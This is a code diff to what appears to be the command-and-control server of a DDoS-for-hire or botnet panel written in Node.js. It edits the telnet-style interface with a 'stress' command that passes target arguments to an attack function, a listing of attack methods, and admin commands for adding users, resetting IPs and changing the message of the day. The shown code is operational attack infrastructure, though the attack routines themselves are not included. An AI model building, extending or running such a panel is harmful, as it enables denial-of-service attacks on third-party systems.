@@ -22,7 +22,7 @@ const eExtra = require("./CNC/Extra/functions.js");
 
 
 Server.svr.on('connection', async function(socket) {
-    eExtra.set_TerminalSize(40, 80, socket);
+    eExtra.set_TerminalSize(26, 80, socket);
 
     /*
     *                           CONNECTING USER
@@ -107,10 +107,10 @@ Server.svr.on('connection', async function(socket) {
         } else if(eConfig.CurrentCmd.Cmd === "stress") {
             console.log(eConfig.CurrentCmd.arg);
             socket.write(await eExtra.send_attack(eConfig.CurrentCmd.arg[1], eConfig.CurrentCmd.arg[2], eConfig.CurrentCmd.arg[3], eConfig.CurrentCmd.arg[4]) + Config.hostname(Current[0]));
-        } else if(eConfig.CurrentCmd.Cmd === "udp") {
-            
+        } else if(eConfig.CurrentCmd.Cmd === "methods") {
+            socket.write(Config.Colors.Clear + Banners.main_b() + Banners.methods() + Config.hostname(Current[0]));
         } else if(eConfig.CurrentCmd.Cmd === "admin") {
-            if(eCrud.isAdmin(Current[0])) {
+            if(eCrud.isAdmin(Current[0]) || eConfig.CurrentUser.isAdmin === true) {
                 let tool = eConfig.CurrentCmd.arg[1];
                 let arg2 = eConfig.CurrentCmd.arg[2];
                 let arg3 = eConfig.CurrentCmd.arg[3];
@@ -119,7 +119,7 @@ Server.svr.on('connection', async function(socket) {
                 let arg6 = eConfig.CurrentCmd.arg[6];
                 let arg7 = eConfig.CurrentCmd.arg[7];
                 if(tool === "add") {
-                    let resp = Crud.addUser(arg2, arg3, arg4, arg5, arg6, arg7);
+                    let resp = Crud.addUser(arg2, "none", arg3, arg4, arg5, arg6);
                     socket.write(resp + Config.hostname(Current[0]));                    
                 } else if(tool === "remove") {
                     socket.write(Crud.removeUser(arg2) + Config.hostname(Current[0]));
@@ -127,7 +127,7 @@ Server.svr.on('connection', async function(socket) {
                     socket.write(Crud.userUpdate(arg2, arg3, arg4, arg5) + Config.hostname(Current[0]));
                 } else if(tool === "change_motd") {
                     let msg = eExtra.CleanMOTD(eConfig.CurrentCmd.arg);
-                    socket.write(Crud.change_motd(msg.replace(eConfig.CurrentCmd.arg[0] + " " + eConfig.CurrentCmd.arg[1], "")));
+                    socket.write(Crud.change_motd(msg.replace(eConfig.CurrentCmd.arg[0] + " " + eConfig.CurrentCmd.arg[1], ""))+ Config.hostname(Current[0]));
                 } else if(tool === "reset_ip") {
                     socket.write(Crud.resetIP(arg2, arg3) + Config.hostname(Current[0]));
                 } else if(tool === "change_pw") {
